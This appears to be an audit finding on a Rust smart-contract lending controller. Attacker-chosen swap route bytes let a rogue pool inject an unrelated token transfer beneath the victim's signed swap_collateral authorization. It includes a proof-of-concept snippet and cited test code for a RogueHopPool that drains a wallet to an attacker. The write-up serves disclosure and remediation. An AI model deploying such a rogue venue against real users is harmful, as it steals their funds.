### Title
Caller-supplied swap routes can inject wallet-draining authorization sub-invocations - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral` accepts attacker-controlled `swap` bytes, authenticates `caller`, withdraws collateral, and forwards the opaque route to the configured router without decoding or constraining the contracts reached by that route. [1](#0-0) [2](#0-1)  A route-selected contract can request `caller` authorization for an unrelated token transfer, causing simulation to place that transfer beneath the caller’s `swap_collateral` authorization; if the caller signs the poisoned tree, the transfer executes. [3](#0-2) [4](#0-3) 

### Finding Description
The strongest unprivileged path is `Controller::swap_collateral(caller, account_id, current, amount, new, swap)`, where `swap` is arbitrary `Bytes` supplied by the transaction submitter. [5](#0-4)  The controller checks the caller and account ownership before execution, so the caller’s authorization is the root context for everything subsequently invoked by the strategy. [1](#0-0) 

After collateral is withdrawn to the controller, `withdraw_and_swap_from_supply` passes the unmodified `swap` payload into `swap_tokens_or_passthrough`. [6](#0-5)  `swap_tokens` only requires the payload to be nonempty, authorizes one exact controller-to-router transfer, and invokes `router.execute_strategy(&controller, &amount_in, swap)`. [7](#0-6) [2](#0-1) 

Because route execution can reach an arbitrary pool contract, that contract can make an unrelated `token.transfer(caller, attacker, amount)` call requiring caller authorization. [8](#0-7)  The repository’s host-level test shows that simulation records this unrelated transfer as a sub-invocation of the caller’s `swap_collateral` authorization. [4](#0-3) 

### Impact Explanation
A malicious route can steal any wallet token held by the victim, including assets unrelated to the lending position or listed markets, while still returning a valid swap output. [9](#0-8)  The measured-output and final-risk checks do not detect the theft because they only inspect the input spend and output balance for the swap; they do not reject additional caller-authorized sub-invocations. [10](#0-9)  This is theft of user funds, but the attacker must convince the victim to sign the expanded authorization tree. [11](#0-10) 

### Likelihood Explanation
No protocol privilege, leaked key, upgrade, or compromised oracle is required: the attacker deploys the malicious venue and supplies route bytes that cause it to be invoked. [12](#0-11)  Execution fails if the victim signs only the honest root authorization, but succeeds when a wallet, SDK, or user signs the simulated tree containing the injected token transfer. [13](#0-12) [14](#0-13) 

### Recommendation
Do not execute route-selected, unallowlisted contracts underneath a caller-authenticated strategy root. Restrict executable hop pools/venues to governance-reviewed immutable contracts, and make transaction builders reject any simulated `swap_collateral`, `multiply`, `swap_debt`, or `repay_debt_with_collateral` authorization tree containing caller sub-invocations beyond the expected root authorization.

### Proof of Concept
The repository test constructs a route naming `RogueHopPool`; during route execution, the pool calls `token.transfer(victim, attacker, WALLET_BALANCE)`. [12](#0-11) [8](#0-7) 

```rust
// Inside the route-selected RogueHopPool::swap.
token::Client::new(&env, &wallet_token)
    .transfer(&victim, &attacker, &amount);
```

Simulation attaches that transfer beneath Alice’s `swap_collateral` authorization, and signing that tree moves her full unrelated wallet balance to the attacker while crediting the expected swap output. [15](#0-14) [11](#0-10)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap.rs (L21-22)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);
```

**File:** contracts/controller/src/strategies/swap.rs (L33-37)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L214-226)
```rust
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-256)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/lib.rs (L283-291)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
```

**File:** contracts/controller/src/strategies/legs.rs (L255-258)
```rust
        },
    );

    swap_tokens_or_passthrough(env, caller, &from.asset, actual_withdrawn, token_out, swap)
```
